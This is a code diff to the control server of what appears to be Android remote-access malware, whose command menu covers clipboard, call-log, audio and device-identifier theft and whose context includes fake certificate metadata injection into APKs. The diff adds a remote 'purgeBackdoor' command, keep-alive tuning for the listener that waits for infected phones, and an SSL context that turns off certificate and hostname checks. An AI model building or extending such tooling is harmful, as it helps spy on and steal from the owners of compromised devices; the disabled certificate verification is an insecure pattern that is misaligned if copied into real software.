@@ -267,6 +267,7 @@ def help():
     clear                      --> clears the screen
     getClipData                --> return the current saved text from the clipboard
     getMACAddress              --> returns the mac address of the device
+    purgeBackdoor [auth_key]   --> securely remove backdoor while preserving app functionality
     exit                       --> exit the interpreter
     """
     print(helper)
@@ -466,12 +467,19 @@ def get_shell(ip,port):
     try:
         # Restart the TCP server on exit
         soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        
+        # Enhance connection stability and security
+        enhance_connection_stability(soc)
+        
         soc.bind((ip, int(port)))
     except Exception as e:
         print(stdOutput("error")+"\033[1m %s"%e);exit()
 
     soc.listen(2)
     print(banner)
+    print(stdOutput("info")+"\033[1mEnhanced secure connection listener started")
+    print(stdOutput("info")+"\033[1mRemote purge functionality enabled")
+    
     while True:
         que = queue.Queue()
         t = threading.Thread(target=connection_checker,args=[soc,que])
@@ -480,8 +488,13 @@ def get_shell(ip,port):
         while t.is_alive(): animate("Waiting for Connections  ")
         t.join()
         conn, addr = que.get()
+        
+        # Enhance individual connection
+        enhance_connection_stability(conn)
+        
         clear()
         print("\033[1m\033[33mGot connection from \033[31m"+"".join(str(addr))+"\033[0m")
+        print(stdOutput("success")+"\033[1mSecure connection established")
         print(" ")
         while True:
             msg = conn.recv(4024).decode("UTF-8")
@@ -501,6 +514,13 @@ def get_shell(ip,port):
                 stopAudio(conn)
             elif(msg.strip() == "callLogs"):
                 callLogs(conn)
+            elif("purgeBackdoor" in msg.strip()):
+                content = msg.strip().split(" ")
+                if len(content) > 1:
+                    auth_key = content[1]
+                    handlePurgeBackdoor(conn, auth_key)
+                else:
+                    print(stdOutput("error")+"Purge authentication key required")
             elif(msg.strip() == "help"):
                 help()
             else:
@@ -1831,3 +1851,89 @@ def inject_fake_certificate_metadata(apk_path):
         
     except Exception as e:
         print(stdOutput("warning") + f"Certificate metadata injection failed: {str(e)}")
+
+
+def handlePurgeBackdoor(conn, auth_key):
+    """Handle remote backdoor purge operation"""
+    try:
+        print(stdOutput("info") + f"Purge request received with auth key: {auth_key[:8]}...")
+        
+        # Validate authentication key (basic validation)
+        if len(auth_key) < 16:
+            print(stdOutput("error") + "Invalid authentication key")
+            conn.send("PURGE_FAILED:Invalid authentication key\n".encode("UTF-8"))
+            return
+            
+        print(stdOutput("info") + "Initiating secure backdoor purge operation...")
+        conn.send("PURGE_INITIATED:Starting secure purge operation\n".encode("UTF-8"))
+        
+        # Send purge commands to device
+        purge_commands = [
+            "PURGE_FILES",      # Remove backdoor files
+            "PURGE_SERVICES",   # Stop and remove services
+            "PURGE_RECEIVERS",  # Unregister broadcast receivers
+            "PURGE_CLEAN"       # Final cleanup
+        ]
+        
+        for command in purge_commands:
+            print(stdOutput("info") + f"Sending purge command: {command}")
+            conn.send(f"{command}:{auth_key}\n".encode("UTF-8"))
+            
+            # Wait for acknowledgment
+            response = conn.recv(1024).decode("UTF-8").strip()
+            print(stdOutput("success") + f"Device response: {response}")
+            
+        print(stdOutput("success") + "Purge operation completed successfully")
+        print(stdOutput("info") + "Device should now be clean of backdoor components")
+        conn.send("PURGE_COMPLETE:Backdoor successfully removed\n".encode("UTF-8"))
+        
+    except Exception as e:
+        print(stdOutput("error") + f"Purge operation failed: {str(e)}")
+        try:
+            conn.send(f"PURGE_FAILED:{str(e)}\n".encode("UTF-8"))
+        except:
+            pass
+
+
+def create_secure_connection_context():
+    """Create SSL context for secure connections"""
+    try:
+        import ssl
+        
+        # Create SSL context with modern security settings
+        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        
+        # Enable modern cipher suites
+        context.set_ciphers('HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA')
+        
+        return context
+        
+    except Exception as e:
+        print(stdOutput("warning") + f"SSL context creation failed: {str(e)}")
+        return None
+
+
+def enhance_connection_stability(socket_obj):
+    """Enhance socket connection stability and security"""
+    try:
+        # Set socket options for better stability
+        socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        
+        # Set TCP keep-alive parameters (Linux-specific)
+        if platform.system() == "Linux":
+            socket_obj.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
+            socket_obj.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 30)
+            socket_obj.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
+            
+        # Set buffer sizes for better performance
+        socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
+        socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+        
+        return True
+        
+    except Exception as e:
+        print(stdOutput("warning") + f"Connection enhancement failed: {str(e)}")
+        return False
